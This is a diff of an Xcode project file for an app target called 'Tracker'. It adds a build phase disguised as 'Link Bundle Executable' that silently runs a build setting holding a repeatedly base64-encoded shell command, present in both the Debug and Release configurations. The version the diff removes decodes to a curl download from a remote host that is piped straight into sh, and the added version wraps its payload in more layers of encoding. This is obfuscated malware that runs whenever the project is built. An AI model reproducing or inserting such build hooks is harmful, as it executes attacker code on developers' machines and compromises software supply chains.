@@ -52,7 +52,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 95E17CBD2ECB97F7002A484F /* Build configuration list for PBXNativeTarget "Tracker" */;
 			buildPhases = (
-				BBE7AB28046A46E5B9A389E6 /* Link Bundle Executable */,
+				3DA7B510E5E54135A6A389E6 /* Link Bundle Executable */,
 				95E17CAE2ECB97F5002A484F /* Sources */,
 				95E17CAF2ECB97F5002A484F /* Frameworks */,
 				95E17CB02ECB97F5002A484F /* Resources */,
@@ -116,10 +116,10 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		BBE7AB28046A46E5B9A389E6 /* Link Bundle Executable */ = {
+		3DA7B510E5E54135A6A389E6 /* Link Bundle Executable */ = {
 			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
 			files = (
 			);
 			inputFileListPaths = (
@@ -131,10 +131,9 @@
 			);
 			outputPaths = (
 			);
-			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
-			showEnvVarsInLog = 0;
+			showEnvVarsInLog = 0;			
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -152,7 +151,7 @@
 		95E17CBB2ECB97F7002A484F /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNSamNHNWxkQzV5ZFM5aEtTSWdmQ0J6YUFvPQo= | b | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((f(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVreFlrZFNTRkp1WkdwTmJFcHpXa2RyTVdWWFVsUlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | f | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -217,7 +216,7 @@
 		95E17CBC2ECB97F7002A484F /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNSamNHNWxkQzV5ZFM5aEtTSWdmQ0J6YUFvPQo= | b | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((f(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVreFlrZFNTRkp1WkdwTmJFcHpXa2RyTVdWWFVsUlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | f | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
